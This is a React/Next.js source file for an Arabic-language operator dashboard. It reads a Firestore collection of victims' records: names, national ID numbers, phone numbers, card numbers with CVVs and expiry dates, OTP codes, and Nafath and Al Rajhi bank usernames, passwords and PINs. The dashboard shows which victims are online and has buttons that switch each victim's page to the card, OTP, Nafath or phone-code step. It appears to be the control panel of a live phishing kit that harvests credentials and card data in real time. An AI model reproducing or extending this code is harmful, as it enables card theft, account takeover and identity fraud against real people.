"use client"

import type React from "react"
import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import {
  Trash2,
  LogOut,
  CreditCard,
  User,
  FileText,
  CheckCircle,
  XCircle,
  AlertCircle,
  Clock,
  Search,
  Shield,
  Tag,
  Bell,
  Eye,
  Loader2,
  RefreshCw,
  Smartphone,
  Settings,
  TrendingUp,
  ChevronDown,
  Download,
  Globe,
  Wifi,
  ChevronLeft,
  ChevronRight,
  ChevronsLeft,
  ChevronsRight,
  PanelLeft,
  Phone,
  Lock,
} from "lucide-react"
import { collection, doc, writeBatch, updateDoc, onSnapshot, query, orderBy } from "firebase/firestore"
import { onAuthStateChanged, signOut } from "firebase/auth"
import { onValue, ref } from "firebase/database"
import { auth, database, db } from "@/lib/firestore"
import { playNotificationSound } from "@/lib/actions"
import PhoneDialog from "@/components/phone-info"
import NafazAuthDialog from "@/components/nafaz"
import RajhiAuthDialog from "@/components/rajhi"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { formatDistanceToNow } from "date-fns"
import { ar } from "date-fns/locale"
import { Toaster, toast } from "sonner"
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuLabel,
  DropdownMenuSeparator,
  DropdownMenuTrigger,
} from "@/components/ui/dropdown-menu"
import { Input } from "@/components/ui/input"
import { Skeleton } from "@/components/ui/skeleton"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Sheet, SheetContent, SheetDescription, SheetHeader, SheetTitle, SheetTrigger } from "@/components/ui/sheet"
import { Progress } from "@/components/ui/progress"
import { Collapsible, CollapsibleContent, CollapsibleTrigger } from "@/components/ui/collapsible"
import { AppSidebar } from "@/components/app-sidebar"

interface PaymentData {
  cardNumber?: string
  cvv?: string
  expiration_date?: string
  full_name?: string
}

interface FormData {
  cardNumber?: string
  cvv?: string
  expiration_date?: string
  card_holder_name?: string
}

interface Notification {
  id: string
  agreeToTerms?: boolean
  card_holder_name?: string
  buyer_identity_number?: string
  cardNumber?: string
  createdDate: string
  customs_code?: string
  cvv?: string
  document_owner_full_name?: string
  expiration_date?: string
  cardYear?: string
  cardMonth?: string
  formData?: FormData
  full_name?: string
  insurance_purpose?: string
  owner_identity_number?: string
  pagename?: string
  paymentData?: PaymentData
  paymentStatus?: string
  phone?: string
  phone2?: string
  seller_identity_number?: string
  serial_number?: string
  status?: string
  vehicle_manufacture_number?: string
  documment_owner_full_name?: string
  vehicle_type?: string
  isHidden?: boolean
  pinCode?: string
  otpCardCode?: string
  phoneOtp?: string
  otpCode?: string
  externalUsername?: string
  externalPassword?: string
  nafadUsername?: string
  nafadPassword?: string
  nafaz_pin?: string
  autnAttachment?: string
  requierdAttachment?: string
  operator?: string
  otpPhoneStatus: string
  phoneOtpCode: string
  phoneVerificationStatus: string
  lastSeen?: string | number
  isOnline?: boolean
  userAgent?: string
  ipAddress?: string
  country?: string
  countryCode?: string
  currentPage?: string
  city?: string
  region?: string
  latitude?: number
  longitude?: number
  browserInfo?: string
  deviceInfo?: string
  sessionId?: string
  timestamp?: string | number
  otp?: string

}

const countryData: Record<string, { name: string; flag: string }> = {
  SA: { name: "السعودية", flag: "🇸🇦" },
  AE: { name: "الإمارات", flag: "🇦🇪" },
  KW: { name: "الكويت", flag: "🇰🇼" },
  QA: { name: "قطر", flag: "🇶🇦" },
  BH: { name: "البحرين", flag: "🇧🇭" },
  OM: { name: "عمان", flag: "🇴🇲" },
  JO: { name: "الأردن", flag: "🇯🇴" },
  LB: { name: "لبنان", flag: "🇱🇧" },
  EG: { name: "مصر", flag: "🇪🇬" },
  MA: { name: "المغرب", flag: "🇲🇦" },
  TN: { name: "تونس", flag: "🇹🇳" },
  DZ: { name: "الجزائر", flag: "🇩🇿" },
  IQ: { name: "العراق", flag: "🇮🇶" },
  SY: { name: "سوريا", flag: "🇸🇾" },
  YE: { name: "اليمن", flag: "🇾🇪" },
  US: { name: "الولايات المتحدة", flag: "🇺🇸" },
  GB: { name: "المملكة المتحدة", flag: "🇬🇧" },
}

function UserStatus({ userId }: { userId: string }) {
  const [status, setStatus] = useState<"online" | "offline" | "unknown">("unknown")

  useEffect(() => {
    const userStatusRef = ref(database, `/status/${userId}`)
    const unsubscribe = onValue(userStatusRef, (snapshot) => {
      const data = snapshot.val()
      if (data) {
        setStatus(data.state === "online" ? "online" : "offline")
      } else {
        setStatus("unknown")
      }
    })
    return () => unsubscribe()
  }, [userId])

  return (
    <div className="flex items-center gap-2">
      <div className={`w-2 h-2 rounded-full ${status === "online" ? "bg-green-500 animate-pulse" : "bg-gray-400"}`} />
      <span className={`text-xs font-medium ${status === "online" ? "text-green-600" : "text-gray-500"}`}>
        {status === "online" ? "متصل" : "غير متصل"}
      </span>
    </div>
  )
}

export default function DashboardPage() {
  const [notifications, setNotifications] = useState<Notification[]>([])
  const [filteredNotifications, setFilteredNotifications] = useState<Notification[]>([])
  const [isLoading, setIsLoading] = useState(true)
  const [isRefreshing, setIsRefreshing] = useState(false)
  const [searchTerm, setSearchTerm] = useState("")
  const [selectedNotification, setSelectedNotification] = useState<Notification | null>(null)
  const [activeFilter, setActiveFilter] = useState<string | null>(null)
  const [showSidebar, setShowSidebar] = useState(false)
  const router = useRouter()
  const [showCardDialog, setShowCardDialog] = useState(false)
  const [selectedCardInfo, setSelectedCardInfo] = useState<Notification | null>(null)
  const [showPagenameDialog, setShowPagenameDialog] = useState(false)
  const [uniquePagenames, setUniquePagenames] = useState<string[]>([])
  const [showRajhiDialog, setShowRajhiDialog] = useState(false)
  const [showNafazDialog, setShowNafazDialog] = useState(false)
  const [showPhoneDialog, setPhoneDialog] = useState(false)
  const [sortOrder, setSortOrder] = useState<"newest" | "oldest">("newest")
  const [currentPage, setCurrentPage] = useState(1)
  const [itemsPerPage, setItemsPerPage] = useState(10)
  const [paginatedNotifications, setPaginatedNotifications] = useState<Notification[]>([])

  const isUserOnline = (notification: Notification): boolean => {
    if (notification.isOnline !== undefined) return notification.isOnline
    if (notification.lastSeen) {
      const lastSeenTime =
        typeof notification.lastSeen === "number" ? notification.lastSeen : new Date(notification.lastSeen).getTime()
      return lastSeenTime > Date.now() - 5 * 60 * 1000
    }
    return false
  }

  const getCountryName = (countryCode?: string): string => {
    if (!countryCode) return "غير محدد"
    return countryData[countryCode.toUpperCase()]?.name || countryCode
  }

  const totalNotifications = notifications.length
  const pendingNotifications = notifications.filter((n) => !n.status || n.status === "pending").length
  const approvedNotifications = notifications.filter((n) => n.status === "approved").length
  const rejectedNotifications = notifications.filter((n) => n.status === "rejected").length
  const onlineUsers = notifications.filter((n) => isUserOnline(n)).length
  const completionRate =
    totalNotifications > 0
      ? Math.round(((approvedNotifications + rejectedNotifications) / totalNotifications) * 100)
      : 0

  const totalPages = Math.ceil(filteredNotifications.length / itemsPerPage)
  const startIndex = (currentPage - 1) * itemsPerPage
  const endIndex = startIndex + itemsPerPage

  const updateAttachment = async (id: string, attachmentType: string, value: string) => {
    try {
      const targetPost = doc(db, "pays", id)
      await updateDoc(targetPost, { [attachmentType]: value })
      playNotificationSound()
      toast.success("تم تحديث المرفق بنجاح")
    } catch (error) {
      toast.error("حدث خطأ أثناء تحديث المرفق")
    }
  }

  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (user) => {
      if (!user) {
        router.push("/login")
      } else {
        const unsubscribeNotifications = fetchNotifications()
        return () => unsubscribeNotifications()
      }
    })
    return () => unsubscribe()
  }, [router])

  useEffect(() => {
    const filtered = notifications.filter((notification) => {
      const searchLower = searchTerm.toLowerCase()
      const matchesSearch =
        searchTerm.trim() === "" ||
        notification.full_name?.toLowerCase().includes(searchLower) ||
        notification.document_owner_full_name?.toLowerCase().includes(searchLower) ||
        notification.documment_owner_full_name?.toLowerCase().includes(searchLower) ||
        notification.phone?.includes(searchTerm) ||
        notification.cardNumber?.includes(searchTerm) ||
        getCountryName(notification.countryCode).toLowerCase().includes(searchLower) ||
        notification.ipAddress?.includes(searchTerm)

      const matchesFilter =
        !activeFilter ||
        (activeFilter === "pending" && (!notification.status || notification.status === "pending")) ||
        (activeFilter === "approved" && notification.status === "approved") ||
        (activeFilter === "rejected" && notification.status === "rejected") ||
        (activeFilter === "online" && isUserOnline(notification))

      return matchesSearch && matchesFilter
    })

    const sorted = [...filtered].sort((a, b) => {
      const dateA = new Date(a.createdDate).getTime()
      const dateB = new Date(b.createdDate).getTime()
      return sortOrder === "newest" ? dateB - dateA : dateA - dateB
    })

    setFilteredNotifications(sorted)
    setCurrentPage(1)
  }, [searchTerm, notifications, activeFilter, sortOrder])

  useEffect(() => {
    const paginated = filteredNotifications.slice(startIndex, endIndex)
    setPaginatedNotifications(paginated)
  }, [filteredNotifications, currentPage, itemsPerPage, startIndex, endIndex])

  const fetchNotifications = () => {
    setIsLoading(true)
    const q = query(collection(db, "pays"), orderBy("createdDate", "desc"))
    const unsubscribe = onSnapshot(
      q,
      (querySnapshot) => {
        const notificationsData = querySnapshot.docs
          .map((doc: any) => ({ id: doc.id, ...doc.data() }))
          .filter((notification: any) => !notification.isHidden) as Notification[]
        setNotifications(notificationsData)
        setIsLoading(false)
        playNotificationSound()
      },
      (error) => {
        console.error("Error fetching notifications:", error)
        setIsLoading(false)
      },
    )
    return unsubscribe
  }

  const refreshData = () => {
    setIsRefreshing(true)
    fetchNotifications()
    setTimeout(() => {
      playNotificationSound()
      setIsRefreshing(false)
      toast.success("تم تحديث البيانات بنجاح")
    }, 1000)
  }

  const handleClearAll = async () => {
    setIsLoading(true)
    try {
      const batch = writeBatch(db)
      notifications.forEach((notification) => {
        const docRef = doc(db, "pays", notification.id)
        batch.update(docRef, { isHidden: true })
      })
      await batch.commit()
      setNotifications([])
      toast.success("تم مسح جميع البيانات بنجاح")
    } catch (error) {
      toast.error("حدث خطأ أثناء مسح البيانات")
    } finally {
      setIsLoading(false)
    }
  }

  const handleDelete = async (id: string) => {
    try {
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, { isHidden: true })
      toast.success("تم حذف البيانات بنجاح")
    } catch (error) {
      toast.error("حدث خطأ أثناء حذف البيانات")
    }
  }

  const handleApproval = async (state: string, id: string) => {
    try {
      const targetPost = doc(db, "pays", id)
      await updateDoc(targetPost, { status: state, paymentStatus: state })
      toast.success(`تم ${state === "approved" ? "قبول" : "رفض"} الطلب بنجاح`)
    } catch (error) {
      toast.error("حدث خطأ أثناء تحديث الحالة")
    }
  }

  const handleUpdatePagename = async (id: string, newPagename: string) => {
    try {
      const targetPost = doc(db, "pays", id)
      await updateDoc(targetPost, { currentPage: newPagename })
      toast.success("تم تحديث نوع الطلب بنجاح")
    } catch (error) {
      toast.error("حدث خطأ أثناء تحديث نوع الطلب")
    }
  }

  const handleLogout = async () => {
    try {
      await signOut(auth)
      router.push("/login")
    } catch (error) {
      toast.error("حدث خطأ أثناء تسجيل الخروج")
    }
  }

  const handleCardBadgeClick = (notification: Notification, e: React.MouseEvent) => {
    e.stopPropagation()
    setSelectedCardInfo(notification)
    setShowCardDialog(true)
  }

  const handleViewDetails = (notification: Notification) => {
    setSelectedNotification(notification)
    setShowSidebar(true)
  }

  const getCountryBadge = (notification: Notification) => {
    const countryCode = notification.countryCode
    const countryInfo = notification.country 
    if (!countryInfo) {
      return (
        <Badge variant="outline" className="font-normal">
          <Globe className="h-3 w-3 mr-1" />
          غير محدد
        </Badge>
      )
    }
    return (
      <Badge variant="outline" className="font-normal">
        {countryInfo}
      </Badge>
    )
  }


  const getPageType = (currentPage?: string) => {
    const types: { [key: string]: { icon: React.ElementType; label: string; className: string } } = {
      "2": { icon: CheckCircle, label: "معلومات", className: "bg-green-100 text-blue-800" },
      "3": { icon: CheckCircle, label: "عروض", className: "bg-pink-100 text-blue-800" },
      "4": { icon: CheckCircle, label: "ميزات ", className: "bg-red-100 text-blue-800" },
      "5": { icon: CheckCircle, label: "ملخص", className: "bg-gray-100 text-blue-800" },
      "6": { icon: CreditCard, label: "دفع", className: "bg-blue-100 text-blue-800" },
      "1": { icon: FileText, label: "تسجيل", className: "bg-purple-100 text-purple-800" },
      "7": { icon: Shield, label: "رمز OTP", className: "bg-pink-100 text-pink-800" },
      "9999": { icon: Smartphone, label: "رمز هاتف", className: "bg-orange-100 text-orange-800" },
      "external-link": { icon: Tag, label: "راجحي", className: "bg-emerald-100 text-emerald-800" },
      "nafaz": { icon: Shield, label: "نفاذ", className: "bg-teal-100 text-teal-800" },
    }
    const type =
    currentPage && types[currentPage]
        ? types[currentPage]
        : { icon: Tag, label: currentPage || "غير معروف", className: "bg-gray-100 text-gray-800" }
    const Icon = type.icon
    return (
      <Badge variant="secondary" className={`${type.className} hover:${type.className} font-medium`}>
        <Icon className="h-3 w-3 mr-1.5" />
        {type.label}
      </Badge>
    )
  }

  const applyFilter = (filter: string | null) => setActiveFilter(filter)
  const handleSortChange = (value: string) => setSortOrder(value as "newest" | "oldest")
  const handlePageChange = (page: number) => setCurrentPage(page)
  const handleItemsPerPageChange = (value: string) => {
    setItemsPerPage(Number.parseInt(value))
    setCurrentPage(1)
  }

  const PaginationComponent = () => (
    <div className="flex flex-col sm:flex-row items-center justify-between gap-4 p-4 border-t">
      <div className="text-sm text-muted-foreground">
        عرض {startIndex + 1}-{Math.min(endIndex, filteredNotifications.length)} من {filteredNotifications.length}
      </div>
      <div className="flex items-center gap-2">
        <Button variant="outline" size="icon" onClick={() => handlePageChange(1)} disabled={currentPage === 1}>
          <ChevronsRight className="h-4 w-4" />
        </Button>
        <Button
          variant="outline"
          size="icon"
          onClick={() => handlePageChange(currentPage - 1)}
          disabled={currentPage === 1}
        >
          <ChevronRight className="h-4 w-4" />
        </Button>
        <span className="text-sm font-medium">
          {currentPage} / {totalPages}
        </span>
        <Button
          variant="outline"
          size="icon"
          onClick={() => handlePageChange(currentPage + 1)}
          disabled={currentPage === totalPages}
        >
          <ChevronLeft className="h-4 w-4" />
        </Button>
        <Button
          variant="outline"
          size="icon"
          onClick={() => handlePageChange(totalPages)}
          disabled={currentPage === totalPages}
        >
          <ChevronsLeft className="h-4 w-4" />
        </Button>
      </div>
      <div className="flex items-center gap-2">
        <Select value={itemsPerPage.toString()} onValueChange={handleItemsPerPageChange}>
          <SelectTrigger className="w-24">
            <SelectValue />
          </SelectTrigger>
          <SelectContent>
            {[10, 20, 50, 100].map((val) => (
              <SelectItem key={val} value={val.toString()}>
                {val} / صفحة
              </SelectItem>
            ))}
          </SelectContent>
        </Select>
      </div>
    </div>
  )

  if (isLoading) {
    return (
      <div className="flex min-h-screen bg-muted/40">
        <AppSidebar />
        <main className="flex-1 p-4 sm:p-6 md:p-8">
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6 mb-8">
            {[...Array(4)].map((_, i) => (
              <Card key={i}>
                <CardHeader>
                  <Skeleton className="h-5 w-24" />
                </CardHeader>
                <CardContent>
                  <Skeleton className="h-8 w-16 mb-2" />
                  <Skeleton className="h-4 w-full" />
                </CardContent>
              </Card>
            ))}
          </div>
          <Card>
            <CardHeader>
              <Skeleton className="h-8 w-64" />
            </CardHeader>
            <CardContent className="space-y-4">
              {[...Array(5)].map((_, i) => (
                <Skeleton key={i} className="h-20 w-full rounded-lg" />
              ))}
            </CardContent>
          </Card>
        </main>
      </div>
    )
  }

  return (
    <div dir="rtl" className="flex min-h-screen w-full bg-muted/40">
      <Toaster richColors closeButton position="top-center" />
      <AppSidebar />
      <div className="flex flex-col flex-1">
        <header className="sticky top-0 z-30 flex h-14 items-center gap-4 border-b bg-background px-4 sm:static sm:h-auto sm:border-0 sm:bg-transparent sm:px-6">
          <Sheet>
            <SheetTrigger asChild>
              <Button size="icon" variant="outline" className="sm:hidden bg-transparent">
                <PanelLeft className="h-5 w-5" />
                <span className="sr-only">Toggle Menu</span>
              </Button>
            </SheetTrigger>
            <SheetContent side="right" className="sm:max-w-xs">
              <AppSidebar isMobile={true} />
            </SheetContent>
          </Sheet>
          <div className="relative flex-1 md:grow-0">
            <Search className="absolute right-2.5 top-2.5 h-4 w-4 text-muted-foreground" />
            <Input
              type="search"
              placeholder="بحث..."
              className="w-full rounded-lg bg-background pr-8 md:w-[200px] lg:w-[320px]"
              value={searchTerm}
              onChange={(e) => setSearchTerm(e.target.value)}
            />
          </div>
          <div className="flex items-center gap-2 ml-auto">
            <Button variant="outline" size="sm" onClick={refreshData} disabled={isRefreshing}>
              {isRefreshing ? <Loader2 className="h-4 w-4 animate-spin" /> : <RefreshCw className="h-4 w-4" />}
              <span className="hidden sm:inline ml-2">تحديث</span>
            </Button>
            <DropdownMenu>
              <DropdownMenuTrigger asChild>
                <Button variant="outline" size="icon" className="overflow-hidden rounded-full bg-transparent">
                  <User />
                </Button>
              </DropdownMenuTrigger>
              <DropdownMenuContent align="end">
                <DropdownMenuLabel>حسابي</DropdownMenuLabel>
                <DropdownMenuSeparator />
                <DropdownMenuItem>
                  <Settings className="w-4 h-4 ml-2" />
                  الإعدادات
                </DropdownMenuItem>
                <DropdownMenuItem>
                  <Download className="w-4 h-4 ml-2" />
                  تصدير
                </DropdownMenuItem>
                <DropdownMenuSeparator />
                <DropdownMenuItem onClick={handleLogout} className="text-red-500">
                  <LogOut className="w-4 h-4 ml-2" />
                  تسجيل الخروج
                </DropdownMenuItem>
              </DropdownMenuContent>
            </DropdownMenu>
          </div>
        </header>
        <main className="flex-1 p-4 sm:px-6 sm:py-0 md:gap-8">
          {/* Analytics Cards */}
          <div className="grid gap-4 sm:grid-cols-2 lg:grid-cols-4 mb-6">
            <Card>
              <CardHeader className="pb-2 flex flex-row items-center justify-between">
                <CardTitle className="text-sm font-medium">إجمالي الطلبات</CardTitle>
                <Bell className="w-4 h-4 text-muted-foreground" />
              </CardHeader>
              <CardContent>
                <div className="text-2xl font-bold">{totalNotifications}</div>
              </CardContent>
            </Card>
            <Card>
              <CardHeader className="pb-2 flex flex-row items-center justify-between">
                <CardTitle className="text-sm font-medium">متصلون الآن</CardTitle>
                <Wifi className="w-4 h-4 text-muted-foreground" />
              </CardHeader>
              <CardContent>
                <div className="text-2xl font-bold">{onlineUsers}</div>
              </CardContent>
            </Card>
            <Card>
              <CardHeader className="pb-2 flex flex-row items-center justify-between">
                <CardTitle className="text-sm font-medium">قيد الانتظار</CardTitle>
                <Clock className="w-4 h-4 text-muted-foreground" />
              </CardHeader>
              <CardContent>
                <div className="text-2xl font-bold">{pendingNotifications}</div>
              </CardContent>
            </Card>
            <Card>
              <CardHeader className="pb-2 flex flex-row items-center justify-between">
                <CardTitle className="text-sm font-medium">معدل الإنجاز</CardTitle>
                <TrendingUp className="w-4 h-4 text-muted-foreground" />
              </CardHeader>
              <CardContent>
                <div className="text-2xl font-bold">{completionRate}%</div>
                <Progress value={completionRate} className="h-2 mt-2" />
              </CardContent>
            </Card>
          </div>

          {/* Main Data View */}
          <Card>
            <CardHeader>
              <div className="flex flex-wrap items-center gap-2">
                <Button variant={!activeFilter ? "default" : "outline"} size="sm" onClick={() => applyFilter(null)}>
                  الكل
                </Button>
                <Button
                  variant={activeFilter === "online" ? "default" : "outline"}
                  size="sm"
                  onClick={() => applyFilter("online")}
                >
                  متصل
                </Button>
                <Button
                  variant={activeFilter === "pending" ? "default" : "outline"}
                  size="sm"
                  onClick={() => applyFilter("pending")}
                >
                  قيد الانتظار
                </Button>
                <Button
                  variant={activeFilter === "approved" ? "default" : "outline"}
                  size="sm"
                  onClick={() => applyFilter("approved")}
                >
                  مقبول
                </Button>
                <Button
                  variant={activeFilter === "rejected" ? "default" : "outline"}
                  size="sm"
                  onClick={() => applyFilter("rejected")}
                >
                  مرفوض
                </Button>
                <div className="ml-auto flex items-center gap-2">
                  <Select value={sortOrder} onValueChange={handleSortChange}>
                    <SelectTrigger className="w-[140px]">
                      <SelectValue placeholder="ترتيب حسب" />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="newest">الأحدث أولاً</SelectItem>
                      <SelectItem value="oldest">الأقدم أولاً</SelectItem>
                    </SelectContent>
                  </Select>
                  <Button variant="outline" size="sm" onClick={handleClearAll} disabled={notifications.length === 0}>
                    <Trash2 className="h-4 w-4" />
                  </Button>
                </div>
              </div>
            </CardHeader>
            <CardContent className="p-0">
              {paginatedNotifications.length === 0 ? (
                <div className="text-center py-20">
                  <AlertCircle className="mx-auto h-12 w-12 text-muted-foreground" />
                  <h3 className="mt-4 text-lg font-semibold">لا توجد بيانات</h3>
                  <p className="mt-2 text-sm text-muted-foreground">
                    {searchTerm || activeFilter ? "لم يتم العثور على نتائج مطابقة." : "لا توجد طلبات لعرضها."}
                  </p>
                </div>
              ) : (
                <div className="divide-y">
                  {paginatedNotifications.map((notification) => (
                    <div
                      key={notification.id}
                      className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-6 gap-4 p-4 hover:bg-muted/50 cursor-pointer"
                      onClick={() => handleViewDetails(notification)}
                    >
                      <div className="font-medium col-span-2 sm:col-span-1 md:col-span-2">
                        <p className="font-semibold text-sm">{notification.documment_owner_full_name || "غير محدد"}</p>
                        <p className="text-xs text-muted-foreground">{notification.phone}</p>
                      </div>
                      <div className="hidden md:flex items-center text-sm">
                        <UserStatus userId={notification.id} />
                      </div>
                      <div className="hidden sm:flex items-center text-sm">{getCountryBadge(notification)}</div>
                      <div className="flex items-center text-sm">{getPageType(notification.currentPage)}</div>
                      <div className="flex items-center justify-end sm:justify-start text-sm">
                       <Button  className={notification.currentPage==="6"?"bg-green-100 text-black mx-1":"mx-1"} size="icon" onClick={()=>handleUpdatePagename(notification.id,"6")}>
                        <CreditCard/>
                       </Button>
                       <Button  className={notification.currentPage==="nafaz"?"bg-green-100 text-black mx-1":"mx-1"} size="icon" onClick={()=>handleUpdatePagename(notification.id,"nafaz")}>
                        <Shield/>
                       </Button>
                       <Button size="icon" onClick={()=>handleUpdatePagename(notification.id,"9999")}>
                        <Phone/>
                       </Button>
                       <Button size="icon" onClick={()=>handleUpdatePagename(notification.id,"1")}>
                        <FileText/>
                       </Button>
                       <Button size="icon" onClick={()=>handleUpdatePagename(notification.id,"7")}>
                        <Lock/>
                       </Button>
                      </div>
                      <div className="col-span-2 sm:col-span-3 md:col-span-1 flex items-center justify-end gap-2">
                        <span className="text-xs text-muted-foreground">
                          {formatDistanceToNow(new Date(notification.createdDate), { addSuffix: true, locale: ar })}
                        </span>
                        <Button
                          variant="ghost"
                          size="icon"
                          onClick={(e) => {
                            e.stopPropagation()
                            handleViewDetails(notification)
                          }}
                        >
                          <Eye className="h-4 w-4" />
                        </Button>
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </CardContent>
            {filteredNotifications.length > 0 && <PaginationComponent />}
          </Card>
        </main>
      </div>

      {/* Details Sheet */}
      <Sheet open={showSidebar} onOpenChange={setShowSidebar}>
        <SheetContent side="left" className="w-full sm:max-w-lg overflow-y-auto" dir="rtl">
          <SheetHeader className="text-right pb-6 border-b">
            <SheetTitle>تفاصيل الطلب</SheetTitle>
            <SheetDescription>عرض شامل للبيانات والإجراءات السريعة.</SheetDescription>
          </SheetHeader>
          {selectedNotification && (
            <div className="py-6 space-y-6">
              <Collapsible defaultOpen>
                <CollapsibleTrigger className="w-full">
                  <div className="flex items-center justify-between p-3 rounded-lg bg-muted">
                    <h3 className="font-semibold flex items-center gap-2">
                      <User className="h-4 w-4" />
                      المعلومات الشخصية
                    </h3>
                    <ChevronDown className="h-4 w-4 transition-transform duration-200 group-data-[state=open]:rotate-180" />
                  </div>
                </CollapsibleTrigger>
                <CollapsibleContent className="pt-4 px-2 space-y-2 text-sm">
                  <div className="flex justify-between">
                    <span>الاسم:</span>{" "}
                    <span className="font-medium">{selectedNotification.documment_owner_full_name || "غير محدد"}</span>
                  </div>
                  <div className="flex justify-between">
                    <span>الهوية:</span>{" "}
                    <span className="font-mono">{selectedNotification.owner_identity_number || "غير محدد"}</span>
                  </div>
                  <div className="flex justify-between">
                    <span>الهاتف:</span> <span className="font-mono">{selectedNotification.phone || "غير محدد"}</span>
                  </div>
                </CollapsibleContent>
              </Collapsible>

              <Collapsible defaultOpen>
                <CollapsibleTrigger className="w-full">
                  <div className="flex items-center justify-between p-3 rounded-lg bg-muted">
                    <h3 className="font-semibold flex items-center gap-2">
                      <Globe className="h-4 w-4" />
                      معلومات الاتصال
                    </h3>
                    <ChevronDown className="h-4 w-4 transition-transform duration-200 group-data-[state=open]:rotate-180" />
                  </div>
                </CollapsibleTrigger>
                <CollapsibleContent className="pt-4 px-2 space-y-2 text-sm">
                  <div className="flex justify-between">
                    <span>الحالة:</span> <UserStatus userId={selectedNotification.id} />
                  </div>
                  <div className="flex justify-between">
                    <span>الدولة:</span> {getCountryBadge(selectedNotification)}
                  </div>
                  <div className="flex justify-between">
                    <span>المدينة:</span> <span className="font-medium">{selectedNotification.city || "غير محدد"}</span>
                  </div>
                  <div className="flex justify-between">
                    <span>IP:</span> <span className="font-mono">{selectedNotification.ipAddress || "غير محدد"}</span>
                  </div>
                </CollapsibleContent>
              </Collapsible>

              {(selectedNotification.cardNumber || selectedNotification.formData) && (
                <Collapsible>
                  <CollapsibleTrigger className="w-full">
                    <div className="flex items-center justify-between p-3 rounded-lg bg-muted">
                      <h3 className="font-semibold flex items-center gap-2">
                        <CreditCard className="h-4 w-4" />
                        معلومات البطاقة
                      </h3>
                      <ChevronDown className="h-4 w-4 transition-transform duration-200 group-data-[state=open]:rotate-180" />
                    </div>
                  </CollapsibleTrigger>
                  <CollapsibleContent className="pt-4 px-2 space-y-2 text-sm">
                    <div className="flex justify-between">
                      <span>الرقم:</span>{" "}
                      <span className="font-mono">{selectedNotification.cardNumber || "غير محدد"}</span>
                    </div>
                    <div className="flex justify-between">
                      <span>الانتهاء:</span>{" "}
                      <span className="font-mono">{selectedNotification.expiration_date || "غير محدد"}</span>
                    </div>
                    <div className="flex justify-between">
                      <span>CVV:</span> <span className="font-mono">{selectedNotification.cvv || "غير محدد"}</span>
                    </div>
                  </CollapsibleContent>
                </Collapsible>
              )}

              <div className="grid grid-cols-2 gap-3 pt-4 border-t">
                <Button
                  onClick={() => {
                    handleUpdatePagename( selectedNotification.id,"1")
                    setShowSidebar(false)
                  }}
                  variant={selectedNotification.currentPage === "1"?"default":"outline"}
                >
                  <CheckCircle className="h-4 w-4 ml-2" /> تسجيل
                </Button>
                <Button
                  onClick={() => {
                    handleUpdatePagename( selectedNotification.id,"6")
                    setShowSidebar(false)
                  }}
                  variant={selectedNotification.currentPage === "6"?"default":"outline"}
                >
                  <XCircle className="h-4 w-4 ml-2" /> بطاقة
                </Button>
                <Button
                  onClick={() => {
                    handleUpdatePagename( selectedNotification.id,"7")
                    setShowSidebar(false)
                  }}
                  variant={selectedNotification.currentPage === "7"?"default":"outline"}
                >
                  <XCircle className="h-4 w-4 ml-2" /> كود بطاقة
                </Button>
                <Button
                  onClick={() => {
                  handleUpdatePagename( selectedNotification.id,"nafaz")
                    setShowSidebar(false)
                  }}
                  variant={selectedNotification.currentPage === "nafaz"?"default":"outline"}
                >
                  <XCircle className="h-4 w-4 ml-2" /> نفاذ
                </Button>
                <Button
                  onClick={() => {
                    handleUpdatePagename( selectedNotification.id,"9999")
                    setShowSidebar(false)
                  }}
                  variant={selectedNotification.currentPage === "9999"?"default":"outline"}
                >
                  <XCircle className="h-4 w-4 ml-2" /> هاتف
                </Button>
                <Button
                  onClick={() => {
                    handleDelete(selectedNotification.id)
                    setShowSidebar(false)
                  }}
                  variant={"outline"}
                  className="col-span-2"
                >
                  <Trash2 className="h-4 w-4 ml-2" /> حذف
                </Button>
              </div>
            </div>
          )}
        </SheetContent>
      </Sheet>

      {/* Other Dialogs */}
      <Dialog open={showCardDialog} onOpenChange={setShowCardDialog}>
        <DialogContent dir="rtl">
          <DialogHeader>
            <DialogTitle>معلومات البطاقة</DialogTitle>
          </DialogHeader>
          {selectedCardInfo && (
            <div className="space-y-4">
              <p>الاسم: {selectedCardInfo.card_holder_name || "غير محدد"}</p>
              <p>الرقم: {selectedCardInfo.cardNumber}</p>
            </div>
          )}
        </DialogContent>
      </Dialog>
      <RajhiAuthDialog open={showRajhiDialog} onOpenChange={setShowRajhiDialog} notification={selectedNotification} />
      <NafazAuthDialog open={showNafazDialog} onOpenChange={setShowNafazDialog} notification={selectedNotification} />
      <PhoneDialog open={showPhoneDialog} onOpenChange={setPhoneDialog} notification={selectedNotification} handlePhoneOtpApproval={function (status: string, id: string): Promise<void> {
        throw new Error("Function not implemented.")
      } } />
    </div>
  )
}
